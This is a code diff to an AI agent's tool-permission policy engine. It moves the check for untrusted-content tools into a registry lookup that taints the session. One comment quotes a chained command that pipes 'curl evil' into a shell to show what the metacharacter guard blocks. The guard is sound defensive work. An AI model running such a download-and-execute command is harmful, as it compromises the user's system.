@@ -76,7 +76,6 @@ SHELL_TOOLS = {"Bash", "PowerShell"}
 WEB_TOOLS = {"WebFetch", "WebSearch"}
 HARMLESS_TOOLS = {"TodoWrite", "Skill", "Agent", "Task", "ToolSearch"}
 INTERNAL_MCP_PREFIX = "mcp__office__"
-UNTRUSTED_OFFICE_TOOLS = {"source_get", "source_search"}
 OFFICE_PREFIXES = (INTERNAL_MCP_PREFIX, "@office/")  # Claude names our tools mcp__office__x, Kiro @office/x
 
 
@@ -86,6 +85,14 @@ def office_tool(tool: str) -> str | None:
         if tool.startswith(prefix):
             return tool[len(prefix):]
     return None
+
+
+def brings_untrusted(tool: str) -> bool:
+    """One of our own tools whose result is content of an outside system (`ToolDef.untrusted`)."""
+    from actoroffice.tools.registry import tool_def  # not at import: the tools import services that import this module
+
+    definition = tool_def(office_tool(tool))
+    return definition is not None and definition.untrusted
 
 # Shell metacharacters that chain or redirect commands. An allow-listed command containing
 # any of these falls back to "ask", so `git status && curl evil | sh` cannot ride on "git status*".
@@ -177,7 +184,7 @@ class PolicyEngine:
         if office_tool(tool) is not None:
             # Our own tools enforce their own rules (ticket ownership, ask_user, …). The ones that bring in a document
             # of an outside system taint the session: what it says is data, and acting outside afterwards asks first.
-            return Verdict(Decision.ALLOW, Risk.READ, taints=office_tool(tool) in UNTRUSTED_OFFICE_TOOLS)
+            return Verdict(Decision.ALLOW, Risk.READ, taints=brings_untrusted(tool))
         if tool in READ_TOOLS:
             return self._file_access(tool, args, ctx, write=False)
         if tool in WRITE_TOOLS:
